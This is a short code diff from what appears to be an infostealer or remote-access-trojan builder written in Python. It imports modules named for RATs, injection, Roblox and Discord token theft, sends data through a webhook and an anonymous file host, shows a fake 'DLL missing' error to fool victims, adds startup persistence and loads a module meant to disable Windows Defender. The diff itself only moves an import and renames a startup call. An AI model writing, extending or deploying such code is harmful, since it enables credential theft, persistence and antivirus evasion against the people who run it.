@@ -3,7 +3,6 @@ import discordc
 import informations
 import malicious
 import rose_rat
-import knight_rat
 import InjectX
 import startup
 import _roblox
@@ -12,7 +11,7 @@ from anonFile import uploadToAnonfiles
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
-
+import knight_rat
 import getpass
 import platform
 import ctypes
@@ -46,7 +45,7 @@ if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
 if cc.get_start_up() is True:
-    startup.start_up()
+    startup.Startup()
 
 if cc.get_defenderfucker() is True:
     import defenderfucker
